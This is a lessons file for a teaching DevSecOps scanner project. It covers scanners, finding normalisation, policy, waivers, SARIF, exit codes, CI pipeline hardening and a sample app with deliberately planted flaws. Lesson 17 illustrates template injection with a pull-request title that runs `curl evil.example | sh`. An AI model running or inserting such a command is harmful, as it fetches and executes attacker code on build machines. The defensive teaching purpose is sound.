# Phase 1 lessons: learn DevSecOps by reading the code

Read this top to bottom with the code open next to it. Each lesson names the file
where the idea lives. Nothing here assumes you know the terms already.

## Step 0: see it work (5 minutes)

```
python3 -m bridge scan sample-app --demo
```

(On Windows, use `python` instead of `python3`.) You should see a table of results
and the line `VERDICT: BLOCKED`. Open `out/report.md` and read it. Everything below
explains how that report came to exist.

---

## The story in one paragraph

`sample-app/` is a tiny web app with security mistakes planted on purpose. Four
**scanners** (programs that inspect code for problems) each look for a different kind
of mistake. They all report in different formats, so the **bridge** translates every
report into one common shape, removes duplicates, asks a **policy** whether the result
is acceptable, and then writes reports and answers "pass" or "blocked".

---

## Lesson 0: what is a scanner, and why four?

A scanner is a program that reads your project and flags known mistakes, a bit like a
spell-checker for security. No single scanner covers everything, so teams run several:

| Scanner | Looks for | Planted example in `sample-app/` |
| --- | --- | --- |
| **Gitleaks** | Secrets (passwords, API tokens) left in code | a fake token in `config.py` |
| **Semgrep** | Risky code patterns (called SAST) | SQL injection in `app.py` line 20 |
| **Trivy** | Known-vulnerable libraries and bad infrastructure settings | old libraries in `requirements.txt`, root user in `Dockerfile` |
| **zizmor** | Unsafe CI/CD pipeline files (GitHub Actions workflows) | `sample-app/.github/workflows/build.yml` (see Lesson 17) |

Why each matters:

- **Secret in code:** anyone who can read the code (or its history) can use the secret.
  Fix by revoking it and loading secrets from outside the code.
- **SQL injection:** an attacker types database commands into a web form and your app
  runs them. Fix by passing user input as parameters, never gluing it into the query.
- **Vulnerable library (CVE):** a CVE is a numbered public record of a known flaw, for
  example `CVE-2018-18074`. You did not write the bug, but you ship it. Fix by upgrading.
- **Running as root in a container:** if an attacker breaks into the app, they get
  maximum power inside the container. Fix by adding a non-root `USER`.

## Lesson 1: one common shape (`bridge/models.py`)

Gitleaks calls the file `File`, Semgrep calls it `path`, Trivy calls it `Target`.
You cannot rank or compare things that are described differently. So we define one
`Finding` shape and convert everything into it. Every later step (policy, reports,
the future dashboard) only knows `Finding`.

> Analogy: three people measure in inches, centimetres and hand-spans. Before comparing,
> everyone converts to centimetres.

**Try it:** open `models.py` and find the five fields that every finding must have.

## Lesson 2: adapters are the "bridge" (`bridge/adapters.py`)

One small function per scanner: raw output in, `Finding` list out. This is the whole
trick behind connecting many tools. To support a fourth scanner later, you write one
more function here and change nothing else.

**Try it:** read `parse_gitleaks`. It is about 15 lines. Notice it never touches policy
or reports.

## Lesson 3: severity is a decision, not a fact (`adapters.py`)

Trivy says `HIGH`, Semgrep says `ERROR`, Gitleaks says nothing. We chose a mapping:
leaked secrets count as `high`, Semgrep `ERROR` becomes `high`, `WARNING` becomes
`medium`. These choices are visible in plain tables at the top of each adapter,
because teams will argue about them and need to change them.

**Try it:** change Semgrep `WARNING` to map to `high`, run the demo, and watch the
`debug enabled` finding start blocking. Undo it afterwards.

## Lesson 4: duplicates destroy trust (`models.py`, `runner.py`)

If two tools report the same leaked password, the team sees two alarms for one problem.
Teams that see noisy reports stop reading them. `deduplicate` merges findings that share
a `dedupe_key` and keeps the more severe one. This is a small taste of what commercial
ASPM tools do at large scale. **Read Lesson 15 too:** the first version of this merged
too eagerly and hid a real finding.

## Lesson 5: never copy a secret into a report (`adapters.py`)

Gitleaks output includes the leaked value itself. Our adapter deliberately drops it.
Reports get pasted into tickets and uploaded to dashboards; copying the secret would
create a new leak. A test (`test_bridge.py`) searches every report file for the token
and fails if it appears.

## Lesson 6: fail soft, but never fake a clean result (`runner.py`)

If a scanner is missing or crashes, the bridge keeps going with the others, but it
records a status (`ok`, `skipped`, `failed`, `demo`) and prints a warning in the report.
If no scanner runs at all, it refuses to produce a report (exit code 2) instead of
saying "all clear". A security tool that silently skips checks is dangerous, because
people trust the green tick.

## Lesson 7: policy is data (`policy.json`, `bridge/policy.py`)

The rules live in a JSON file:

```
"block_at": { "secret": "low", "code": "high", "dependency": "high", "config": "high" }
```

Read it as: any secret blocks, but code and library problems only block at `high` or
above. Security people can change the rules without reading Python. Large companies
do the same with a policy language (OPA, which you will meet in phase 2). **Policy as
code** means the rules are written down, versioned and reviewed, not kept in someone's head.

**Try it:** change `"code": "high"` to `"code": "medium"` and re-run. The `debug enabled`
finding now blocks.

## Lesson 8: waivers need an expiry date (`policy.json`, `policy.py`)

Sometimes you cannot fix something today. A **waiver** records "we accept this for
now, here is why, and we will revisit by this date". Without expiry dates, waivers
pile up and become permanent holes. In this project an expired waiver simply stops
working, and the report lists it so someone notices.

**Try it:** the example waiver expires on 2026-12-31. Change it to a past date and
watch `CVE-2018-1000656` start blocking again, with an "Expired waivers" section in
the report.

## Lesson 9: SARIF, the shared language (`bridge/report.py`)

SARIF is an open standard format for scanner results. We export one `report.sarif`
file. Platforms like GitHub can display SARIF directly in their Security tab, so
writing it once gives you a polished viewer for free (that is phase 3 of the plan).
We produce three reports for three audiences: `report.md` for people, `report.json`
for programs (a dashboard later), `report.sarif` for security platforms.

## Lesson 10: exit codes are how pipelines make decisions (`bridge/cli.py`)

A CI/CD pipeline (the automatic assembly line that builds and ships your code) cannot
read a report. It only checks one number when a program ends: `0` means success,
anything else means failure. Our bridge returns:

- `0` passed
- `1` blocked by policy, so the pipeline stops and nothing ships
- `2` could not do its job

Check it yourself: run the scan, then type `echo $?` (macOS/Linux) or `echo %errorlevel%`
(Windows Command Prompt). In phase 3, GitHub Actions will use exactly this number to stop
a bad pull request.

## Lesson 11: tests protect the trust (`tests/test_bridge.py`)

```
python3 -m unittest discover -s tests -v
```

The tests pin down the behaviours that matter most: severity mapping, dedupe, policy,
waivers, "secret never leaks", and "no scanners means no fake pass". There is also a test
that every sample finding points at a real file and line in `sample-app/`, so the
demo cannot drift away from the app it claims to scan.

## Lesson 12: the layers (`bridge/layers.py`)

Software does not jump from a developer to users. It travels through a chain, and each
link can break in its own way:

```
1 Source code -> 2 Dependencies -> 3 CI/CD pipeline -> 4 Container image
              -> 5 Infrastructure as code -> 6 Kubernetes -> 7 Running system
```

| Layer | What lives there | Planted flaw in `sample-app/` |
| --- | --- | --- |
| Source code | what developers write, and secrets left in it | SQL injection, fake token |
| Dependencies | third-party libraries | old Flask, PyYAML, Jinja2, requests |
| CI/CD pipeline | the automatic build-and-ship line | four planted flaws in `build.yml` (Lesson 17) |
| Container image | the packaged app (Docker) | runs as root |
| Infrastructure as code | servers and cloud described in files (Terraform) | SSH open to the internet (`infra/main.tf`) |
| Kubernetes | the system that runs many containers | privileged container (`k8s/deployment.yaml`) |
| Running system | the live app | none yet (needs live-testing tools) |

Why layers matter: each layer has a different owner and a different fix. A vulnerable
library is fixed by a developer upgrading a version; an open SSH port is fixed by whoever
manages the cloud. Saying "11 problems" is noise. Saying "layers 1, 2, 4, 5 and 6 are
broken, start at layer 1" tells people who must act.

How it works: after the scanners run, `classify()` gives every finding a layer using
simple, visible rules (a secret or code finding is source code; a library finding is
dependencies; a config finding is decided by the file, so `Dockerfile` is container,
`.tf` is infrastructure, a YAML file with `apiVersion` and `kind` is Kubernetes).
`summarize()` then produces one row per layer, in stack order.

**Why "start at the earliest broken layer":** problems travel downstream. A vulnerable
library in layer 2 ends up inside the container in layer 4. Fixing upstream often fixes
several things below it. This is a rule of thumb, not a proof, and the report says so.

**Try it:** run the demo and read the "Layers" section of `out/report.md`. Then delete
the `"CVE-..."` entries from `fixtures/trivy.json` that belong to dependencies and
re-run. The Dependencies row should change.

## Lesson 13: "clean" needs proof (`bridge/layers.py`)

A layer with zero findings is only **clean** if some scanner really looked at it. One
layer in our stack (Running system) has no scanner yet, so the report says **not
scanned**, never "clean". The same rule applies to a scanner that is missing: if Trivy is
not installed, the container layer drops from "clean" to "not scanned" automatically, and
if a project has no `.github/workflows` folder, zizmor has nothing to check and the
pipeline layer shows "not scanned" too. A green tick for something nobody inspected is
how real breaches hide, so the bridge refuses to hand one out.

This also gives you a built-in roadmap: each "not scanned" row is a feature to build.
(The pipeline layer used to be one; Lesson 17 closed it. Runtime testing for layer 7 is
still open.)

**Limits to know about:** our scanners can only see what is in the files you point them
at. The Kubernetes layer here means manifest files in the repo, not a live cluster, and
the container layer means the Dockerfile, not a built image. Scanning the live cluster
and built images comes later.

## Lesson 14: the pipeline (`.github/workflows/securebridge.yml`)

Until now you ran the bridge by hand, so it only worked when you remembered. A **pipeline**
runs it for you, automatically, on every change. GitHub's pipeline tool is called
**GitHub Actions**, and it is configured with a YAML file inside `.github/workflows/`.
Read the workflow file top to bottom with this lesson beside it.

**The skeleton**

- `on:` says when it runs: on every push to `main`, on every pull request (a proposed
  change waiting for review), and by hand from the Actions tab (`workflow_dispatch`).
- `jobs:` are groups of steps, each running on a fresh temporary Linux machine
  (`runs-on: ubuntu-latest`). Nothing from one job carries into the next, which is why
  the scan job installs its own scanners.
- `needs: test` makes the scan wait for the test job. If the engine itself is broken,
  there is no point trusting its verdict.
- `uses:` borrows a ready-made step someone else wrote, such as `actions/checkout@v4`,
  which downloads your code onto the machine.

**Where Lesson 10 pays off.** The step `python -m bridge scan ...` returns exit code 1
when the policy blocks. GitHub sees a failed step, the job turns red, and the pull
request shows a red cross. Nobody has to read anything for the system to say "stop".
That one number is the whole mechanism.

**Choices worth understanding**

1. **Least privilege.** The workflow starts with `permissions: contents: read`, meaning it
   can only read your repo. Only the scan job gets the extra `security-events: write`,
   and only because uploading to the Security tab needs it. If any step were ever
   hijacked, it could do much less damage. Security tools should hold the minimum power.
2. **`if: always()`.** A normal step is skipped once an earlier step fails. But the failure
   is exactly when you most want the report, so the publishing steps use `always()`.
   The scan step itself has no `always()` and no `continue-on-error`, because that would
   swallow the failure and nothing would ever be blocked. A test enforces this.
3. **Versions: latest first, then pin.** `GITLEAKS_VERSION` and `TRIVY_VERSION` start
   empty, meaning "newest release", and the "Show scanner versions" step prints what was
   actually used. Once a run is green, copy those numbers into the two variables. Pinning
   matters because if a scanner updated overnight and changed its output, your pipeline
   could start failing (or worse, passing) for no visible reason. Pinning makes changes
   deliberate; the trade-off is that you bump them yourself now and then.

   *What went wrong the first time (a real lesson):* the first version of this workflow
   downloaded scanners from hand-built URLs with guessed version numbers. GitHub answered
   "not found", `curl -f` exited with code 22, and the job turned red *before any scan ran*.
   A red run can mean "the tool found problems" or "the tool never ran", and you must tell
   them apart by opening the failed step. The install step now uses the GitHub CLI to pick
   the file by name pattern, and if that fails it prints the real file names in the release.
4. **Run summary.** The report is appended to `$GITHUB_STEP_SUMMARY`, so the layer table
   appears on the run's page without opening any file.
5. **SARIF upload.** Lesson 9 pays off here: `upload-sarif` sends `report.sarif` to the
   repository's **Security** tab (Code scanning), where findings show up per file and line.
   Paths there must be relative to the repo root, so the CLI adds the scanned folder as a
   prefix (`sample-app/config.py`, not `config.py`).
6. **Report download.** `upload-artifact` keeps `out/` as a downloadable zip on the run.

**What a pipeline cannot do alone: branch protection.** A red cross is only a warning
until you tell GitHub to enforce it. In the repo's Settings, add a branch protection
rule (or ruleset) for `main` that **requires the `scan` check to pass before merging**.
Without that, someone can merge a blocked pull request anyway.

**Things I could not test from here (be honest with yourself about these)**

- The workflow has never run on GitHub. It is validated as YAML, its safety properties are
  pinned by tests, and the scan step was simulated locally, but the first real run may
  hit a snag. Read the failing step's log; it usually says exactly what is wrong.
- The file-name patterns in "Install the scanners" (`*linux_x64.tar.gz` for Gitleaks,
  `*Linux-64bit.tar.gz` for Trivy) are based on those projects' usual naming and were only
  tested against a stand-in for the GitHub CLI. If the step fails, its log lists the real
  file names, and you only need to adjust the pattern.
- Semgrep's `--config auto` downloads rules from the internet while it runs. That works
  on GitHub's machines, and would not work on a locked-down network.
- Uploading to the Security tab is free on public repositories. On private repositories
  it needs GitHub's paid code scanning; the step is marked `continue-on-error` so it never
  hides the real verdict, and the report is still in the run summary and the download.

**Try it** (see README, "Run it on GitHub"): push the project, open the Actions tab and
watch the run. It should turn red, because the sample app is broken on purpose. Then
change the policy so everything passes (or fix the flaws) and watch it turn green.

## Lesson 15: real output found bugs my samples could not

The first GitHub run used the real scanners, and its report exposed three problems.
This is the most valuable lesson in the project, because it is how real tools get built.

**1. A finding vanished (dedupe was too eager).** The real Trivy run reports many
Kubernetes problems. The first version of `dedupe_key` was "category + file + line", so
two different rules on the same line looked like one problem, and the planted
*privileged container* finding was silently dropped. The report even said "21 duplicates
merged", which sounded tidy and hid the damage. The fix: only merge what is provably the
same (a secret at the same place, the same CVE in the same package, an exact repeat of
one rule). Two regression tests now pin this down.

> General rule: in a security tool, wrongly merging is worse than wrongly keeping. A
> noisy report is annoying; a report that hides a real problem is dangerous.

**2. Findings were filed under the wrong layer.** Semgrep also inspects Dockerfiles and
Kubernetes files, and my layer rules put every Semgrep finding under "Source code". The
real report listed a Dockerfile finding and three Kubernetes findings there. The fix:
look at the *file* first. A test covers each case. Note this is why one tool can span
several layers, and why layers are decided by the bridge, not by the tool.

**3. An open question: Gitleaks reported 0 findings**, but the sample app contains a fake
token (`ghp_...` in `config.py`). Possible reasons, to check one by one:

- The token line in your copy of `config.py` was changed or removed (for example to get
  past GitHub's push protection). Open the file in your repo and look.
- This Gitleaks version's rules or allowlist treat the made-up token as not worth
  reporting. A made-up token can look "too fake" to a smart rule.
- A real command-line problem in `bridge/runner.py`.

Lesson 16 adds a self-test that tells the first two causes from the third automatically.

**Why demo mode could not show any of this:** the saved sample outputs only contained
what I expected to see. Test against the real thing as early as you can.

## Lesson 16: the canary (`gitleaks_self_test` in `bridge/runner.py`)

A scanner that says "0 findings" looks exactly like a scanner that is broken, and that is
the most dangerous failure there is: everyone sees a green result and relaxes. A **canary**
(named after the bird miners carried to detect gas) is a known problem planted on
purpose. Every time Gitleaks runs, the bridge also writes a temporary folder with a made-up
token, runs the *same command* on it, and checks that Gitleaks finds it.

| Self-test | Real scan | What it means |
| --- | --- | --- |
| passes | 0 findings | trustworthy: Gitleaks works and your folder has no secret it recognises |
| passes | finds something | normal |
| fails | anything | the Gitleaks run cannot be trusted: marked `failed` in the report, with its findings still shown |

For our mystery: if the report says "self-test passed" and still 0 findings, Gitleaks
works and the sample token was either changed in your copy or considered too fake to flag
(the canary token is deliberately random-looking, the sample one is a visible pattern). If
the self-test fails, the command or Gitleaks version is the problem.

Two honest limits: the canary proves Gitleaks can find *one kind* of secret, not that it
catches every kind; and it only covers Gitleaks. Semgrep and Trivy could silently go quiet
too, and a canary for each is a sensible later addition.

---

## Lesson 17: the pipeline is a target too (`zizmor`, layer 3)

**Why attackers love pipelines.** Your pipeline holds the keys: it can read your code,
use your secrets, and publish what your customers install. Break into a pipeline and you
do not need to break into the app. Two real examples:

- **SolarWinds (2020):** attackers got into the *build system* and slipped malicious code
  into an official software update, which was then delivered to thousands of customers.
- **tj-actions/changed-files (March 2025):** a popular GitHub Action was tampered with so
  that, as publicly reported, thousands of repositories that used it leaked their secrets
  into their build logs. Repositories that referred to a fixed, full commit were not hit.

So the pipeline file deserves the same scrutiny as application code. **zizmor** is a
scanner built for GitHub Actions workflow files. `sample-app/.github/workflows/build.yml`
contains four planted mistakes (it is a *specimen*: it sits inside `sample-app/`, so
GitHub never runs it, and the real pipeline at the repo root stays safe).

**Quick vocabulary first.** A **trigger** (`on:`) says what starts the workflow. A
**runner** is the temporary machine that runs it. **`GITHUB_TOKEN`** is a password GitHub
creates for each run so the workflow can talk to your repository; its power is set by
`permissions:`. **Secrets** are stored passwords the workflow can use.

**The four planted flaws**

1. **`on: pull_request_target` (rule `dangerous-triggers`).** A normal pull-request trigger
   runs with *no secrets*, because the code comes from outsiders. This special trigger runs
   in the context of *your* repository, with your secrets and write access, even when the
   pull request comes from a stranger's fork. It is safe only if the workflow never runs
   the stranger's code, and the specimen does exactly that (it checks out the pull
   request's code). Safer: use `pull_request`.
2. **`permissions: write-all` (rule `excessive-permissions`).** This hands the run's token
   every permission. If anything in the job is hijacked, the attacker inherits all of it.
   This is *least privilege* again (Lesson 14): start from `contents: read` and add only
   what a job truly needs.
3. **`uses: actions/checkout@main` (rule `unpinned-uses`).** `@main` means "whatever the
   latest code on the main branch is today". If that code changes, or is tampered with, your
   pipeline runs the new version without you ever approving it. The tj-actions incident
   worked like this. Safer: pin to a full commit hash (40 characters) and note the version
   in a comment, because a hash cannot be quietly moved. The same line also triggers
   `artipacked`: checkout leaves your token on disk, which can leak if the folder is later
   uploaded as an artifact. Fix: `persist-credentials: false`.
4. **`run: echo "... ${{ github.event.pull_request.title }}"` (rule `template-injection`).**
   GitHub swaps `${{ ... }}` for its value *before* the shell runs. So if a pull request
   is titled `"; curl evil.example | sh; echo "`, the shell runs that as a command. This is
   *injection*, the same family as the SQL injection in `app.py` (Lesson 0): untrusted text
   becomes code. Fix: pass the value through an environment variable
   (`env: TITLE: ${{ ... }}`) and use `"$TITLE"` in the script, so it stays plain text.

**How the bridge handles it.** `parse_zizmor` in `bridge/adapters.py` turns zizmor's list
into the same `Finding` shape as everything else, so these now appear in the layer table as
**CI/CD pipeline** with the same blocking policy. Notice how little code that took: this is
Lesson 2 paying off. Details worth knowing:

- zizmor counts lines from 0, and the adapter adds 1 (a test pins this).
- zizmor uses its own exit codes: 0 is clean, 11 to 14 mean "found something" (by severity),
  and 1 means it failed. The bridge passes `--no-exit-codes` and also accepts 11 to 14, so
  "found something" is never mistaken for "broke".
- `--offline` makes zizmor skip checks that need internet and a GitHub token (for example
  checking whether an action version has a published vulnerability). That gives identical
  results everywhere but misses those checks, a trade-off you can revisit.
- If the scanned folder has no `.github/workflows`, zizmor is **skipped**, not "clean"
  (Lesson 13).

**Try it:** fix `build.yml` one flaw at a time (change `write-all` to `contents: read`,
pin the checkout to a version tag such as `@v4`), re-run the real scan, and watch the
pipeline row shrink. Also set `SCAN_PATH: "."` in the workflow: the bridge will then scan
**its own pipeline file**, which is a satisfying (and humbling) test.

**Honest limits:** the zizmor sample output in `fixtures/` is hand-written from its
documentation, so the real tool may word things differently. zizmor only understands
GitHub Actions; GitLab CI, Jenkins and others need other tools. And a scanner reads the
file, not the repository settings, so things like "can anyone approve their own pull
request?" are invisible to it.

---

## Lesson 18: the map, DevOps and what DevSecOps adds at each layer

Everything so far in one table. Read it left to right: the DevOps practice, how it goes
wrong, what DevSecOps adds, and which tool in this project does that job.

| Layer | DevOps practice | How it goes wrong | DevSecOps addition | In this project |
| --- | --- | --- | --- | --- |
| 1. Source code | Developers commit to Git, others review | Secrets committed, injection bugs | Secret scanning, SAST, review rules | Gitleaks, Semgrep |
| 2. Dependencies | Reuse open-source libraries | A library you never wrote has a known flaw | Software composition analysis, SBOM, auto-update bots | Trivy (Renovate later) |
| 3. CI/CD pipeline | Automatic build, test, deploy | Pipeline hijacked, over-trusted, secrets leaked | Least-privilege tokens, pinned actions, pipeline scanning | zizmor, the workflow itself |
| 4. Container image | Package the app so it runs anywhere | Runs as root, bloated, old base image | Image scanning, non-root users, signed images | Trivy (Cosign later) |
| 5. Infrastructure as code | Servers and cloud defined in files | Open ports, public storage | Policy checks before anything is created | Trivy (OPA later) |
| 6. Kubernetes | Orchestrate many containers | Privileged pods, no limits, default settings | Admission policies, pod security rules | Trivy (Kyverno later) |
| 7. Running system | Monitor and operate production | Attacks and drift nobody sees | Runtime detection, live testing, alerting | not yet |

Three ideas run through every row:

- **Shift left.** Find problems as early in the chain as you can, because fixing a leaked
  secret in layer 1 costs minutes while fixing it after a breach costs weeks. The layer
  order in the report *is* the left-to-right order.
- **Automate the check, not just the build.** DevOps automated building and shipping.
  DevSecOps adds automated *judgement* at each step: a pass/block decision no one has to
  remember to make. That is the job of the policy and the exit code.
- **Everything as code.** Pipeline, infrastructure and now the rules (`policy.json`) are
  files in Git, so they are reviewed, versioned and testable. This is the idea behind
  "policy as code", coming in phase 2b with OPA.

### Check yourself (answers below)

1. A scanner finds a secret in `config.py` and another finds an open SSH port in
   `main.tf`. Which layers are those, and why might different people fix them?
2. Why does the report say "not scanned" instead of "clean" for the running system?
3. `permissions: write-all` is dangerous even when nothing is wrong today. Why?
4. Why can pinning an action to a full commit protect you from the tj-actions kind of attack,
   while `@v4` or `@main` cannot?
5. What would happen if the bridge treated zizmor's exit code 13 as "the tool crashed"?
6. Why was merging "same file and same line" findings a bug (Lesson 15)?

<details>
<summary>Answers</summary>

1. Source code (layer 1) and Infrastructure as code (layer 5). A developer fixes the
   secret; whoever manages the cloud fixes the port. The layer tells you who to ask.
2. Because no tool inspects it. A "clean" would mean "checked and fine", which would be
   false. Silence is not safety.
3. Least privilege: permissions are about what an attacker could do *if* something else
   goes wrong. Broad rights turn a small break-in into a total one.
4. A tag or branch can be moved to different code after you trusted it; a full commit hash
   identifies exactly one version of the code and cannot be quietly changed.
5. Every run that found anything would be reported as a tool failure, so real findings
   would be hidden behind "failed" and people would stop trusting the report.
6. Two different problems on the same line were treated as one, so a real finding (a
   privileged container) disappeared from the report. Wrongly merging hides risk.

</details>

---

## Running the real scanners

Demo mode reads saved sample outputs from `fixtures/`. Those samples were written by hand
in each tool's output layout, so the real tools may report more, fewer or differently
worded results.

To use the real thing, install the four tools (see README), then:

```
python3 -m bridge scan sample-app
```

The engine runs each installed tool, loads its JSON output through the same adapters,
and the rest is identical. A tool that is not installed is reported as `skipped`.

**Honest caveat:** the exact command-line flags in `bridge/runner.py` were checked for
plumbing (a stand-in script played each tool) but not against the real programs, and
scanner flags change between versions. If a tool reports `failed`, read the detail
line in the report, compare with that tool's `--help`, and adjust `_command()`. That is
a normal part of this work.

## Small glossary for this phase

- **Pipeline (CI/CD):** automatic build, test and deploy steps that run when code changes.
- **Scanner:** a program that inspects code or config for known problems.
- **SAST:** scanning source code without running it.
- **CVE:** a public, numbered record of a known vulnerability.
- **SARIF:** a standard file format for scanner results.
- **Policy:** the rules that decide what is acceptable.
- **Waiver:** a documented, time-limited exception to a rule.
- **Exit code:** the number a program returns to say whether it succeeded.
- **Dedupe:** merging reports of the same problem.

## What comes next (phase 2)

Today the bridge runs on your laptop and the policy is a JSON file. Next:

1. Replace the JSON policy with OPA/Rego rules (real policy as code).
2. Put the bridge inside a GitHub Actions workflow so every pull request is scanned.
3. Store findings in a database behind a small API, which becomes the SaaS backend.
